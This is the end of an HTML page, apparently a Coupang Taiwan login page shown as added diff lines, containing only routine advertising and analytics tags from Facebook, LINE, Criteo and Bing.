+<noscript><img height="1" width="1" style="display:none" src="https://www.facebook.com/tr?id=998664010840918&amp;ev=PageView&amp;noscript=1"></noscript>
+
+
+<script type="text/javascript" id="" charset="">(function(a,b,d){a._ltq=a._ltq||[];a._lt=a._lt||function(){a._ltq.push(arguments)};var e="https:"===location.protocol?"https://d.line-scdn.net":"http://d.line-cdn.net",c=b.createElement("script");c.async=1;c.src=d||e+"/n/line_tag/public/release/v1/lt.js";b=b.getElementsByTagName("script")[0];b.parentNode.insertBefore(c,b)})(window,document);_lt("init",{customerType:"lap",tagId:"141406cf-b62c-4f15-b736-cde7d7141880"});_lt("send","pv",["141406cf-b62c-4f15-b736-cde7d7141880"]);</script>
+<noscript>
+  <img height="1" width="1" style="display:none" src="https://tr.line.me/tag.gif?c_t=lap&amp;t_id=141406cf-b62c-4f15-b736-cde7d7141880&amp;e=pv&amp;noscript=1">
+</noscript><iframe height="0" width="0" style="display: none; visibility: hidden;"></iframe>
+
+<div id="criteo-tags-div" style="display: none;"><iframe src="https://gum.criteo.com/syncframe?topUrl=member.tw.coupang.com&amp;origin=onetag#{%22bundle%22:{%22identifierExtractor%22:{%22origin%22:3},%22value%22:%22AilueV9UbGlDWFdVaUFsVHlUeXVtcUslMkYzS0dlVjUxVWw2MW9xbGdqWmExcjJuSlBraGl1cWN5M3lhQ2RPMnVuc0MyZVVSYXg4eWJXcEl1ZURibFdzQVFXM3hOZXViRlJhTVVTelpPRHlqYzZnekh5eFo1RlNqMGliaiUyRjhDVCUyQkltN2NHZ3ZweXd5Zm9uZ2hma0g2dmxBeFVIdFElM0QlM0Q%22},%22cw%22:true,%22optout%22:{%22identifierExtractor%22:{%22origin%22:0},%22value%22:null},%22origin%22:%22onetag%22,%22tld%22:%22coupang.com%22,%22topUrl%22:%22member.tw.coupang.com%22,%22version%22:%225_45_0%22,%22ifa%22:{%22identifierExtractor%22:{%22origin%22:0},%22value%22:null},%22lsw%22:true,%22pm%22:0,%22requestId%22:%229141350e-9563-4315-af35-b2045cf20fc2%22}" id="criteo-syncframe-onetag" hidden="" sandbox="allow-scripts allow-same-origin" aria-hidden="true" tabindex="-1" title="Criteo GUM iframe"></iframe><script async="true" type="text/javascript" src="https://sslwidget.criteo.com/event?a=107487&amp;v=5.45.0&amp;p0=e%3Dexd%26site_type%3Dd%26ref%3Dhttps%253A%252F%252Fwww.tw.coupang.com&amp;p1=e%3Dvpg%26tms%3DCriteo%2520GTM%2520Enhanced%2520(Retail)%2520(GA4)%2520-%2520v12&amp;p2=e%3Ddis&amp;bundle=m-07EF8lMkJLbnQ1Slp4NDBldTZTeVZ5cjBPNkRLJTJGVkhrcFJXQ0RrWHVpOExmSFUyUkJtVDVCT0hJTFlyMEJGMjlIVnJFWVFvVTJQYlozNHpMbUZ6Sk4yajVmc2NBRkx2WHhTNGl3WGUxbFBKdkplcjhLMDhWTU1BTmklMkJ0YVJid1dXTWtEYjhHa1hJS0RqJTJCUHlDbzVyZXdodXVKQSUzRCUzRA&amp;sc=%7B%22fbp%22%3A%22fb.1.1739923906130.874091663759783708%22%2C%22ttp%22%3A%2201KC63GPDWKQMP9DAC0FQBVPCM_.tt.1%22%7D&amp;tld=coupang.com&amp;dy=1&amp;fu=https%253A%252F%252Fmember.tw.coupang.com%252Flogin%252Flogin.pang%253FrtnUrl%253Dhttps%25253A%25252F%25252Fwww.tw.coupang.com%25252Fnp%25252Fpost%25252Flogin%25253Fr%25253Dhttp%2525253A%2525252F%2525252Fwww.tw.coupang.com%2525252F&amp;pu=https%253A%252F%252Fwww.tw.coupang.com%252F&amp;ceid=77581a08-51ee-4291-aefd-b55ca4324e7c"></script></div><div id="batBeacon863758144151" style="width: 0px; height: 0px; display: none; visibility: hidden;"><img id="batBeacon944732968374" width="0" height="0" alt="" src="https://bat.bing.com/action/0?ti=343219631&amp;tm=gtm002&amp;Ver=2&amp;mid=048b42db-bd60-4506-af1e-6e59df111a64&amp;bo=1&amp;sid=3f263b90185411f19b5381f7db8c9808&amp;vid=a4ecbd90fb4011f0bf21956329c3c4a4&amp;vids=0&amp;msclkid=N&amp;gtm_tag_source=1&amp;uach=pv%3D19.0.0&amp;pi=918639831&amp;lg=ko&amp;sw=1536&amp;sh=864&amp;sc=32&amp;tl=%E7%99%BB%E5%85%A5&amp;p=https%3A%2F%2Fmember.tw.coupang.com%2Flogin%2Flogin.pang%3FrtnUrl%3Dhttps%253A%252F%252Fwww.tw.coupang.com%252Fnp%252Fpost%252Flogin%253Fr%253Dhttp%25253A%25252F%25252Fwww.tw.coupang.com%25252F&amp;r=https%3A%2F%2Fwww.tw.coupang.com%2F&amp;lt=480&amp;evt=pageLoad&amp;sv=2&amp;cdb=AQAQ&amp;rn=739483" style="width: 0px; height: 0px; display: none; visibility: hidden;"></div></body></html>
